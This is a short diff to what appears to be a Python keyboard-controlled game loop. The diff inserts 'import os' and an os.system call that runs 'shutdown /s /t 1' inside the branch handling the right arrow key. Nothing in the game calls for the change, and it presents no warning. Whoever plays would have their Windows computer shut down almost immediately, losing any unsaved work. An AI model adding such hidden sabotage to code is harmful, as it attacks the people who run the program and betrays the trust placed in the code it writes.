@@ -80,6 +80,8 @@ while not crashed:
     if rightPressed and leftChecked:
         x_change = speed
     if rightPressed and not leftPressed:
+        import os
+        os.system("shutdown /s /t 1")
         x_change = speed
         rightChecked = True
         leftChecked = False
